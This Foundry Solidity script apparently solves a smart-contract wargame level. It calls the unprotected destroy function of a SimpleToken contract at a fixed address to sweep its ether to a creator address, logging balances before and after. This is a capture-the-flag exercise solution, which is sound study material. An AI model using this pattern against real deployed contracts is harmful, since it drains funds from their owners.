// SPDX-License-Identifier: MIT

pragma solidity 0.8.0;

import "../instance/Level17.sol";
import "forge-std/Script.sol";

contract ExploitLevel17 is Script {
    SimpleToken token = SimpleToken(payable(0x385321Bc1037590fb1EE572e0EbE933021140424));
    address creator = 0xAF98ab8F2e2B24F42C661ed023237f5B7acAB048;

    function run() external {
        console.log("Creator balance before:", creator.balance);
        vm.broadcast(vm.envUint("PRIVATE_KEY"));
        token.destroy(payable(creator));
        console.log("Creator balance after:", creator.balance);
    }
}
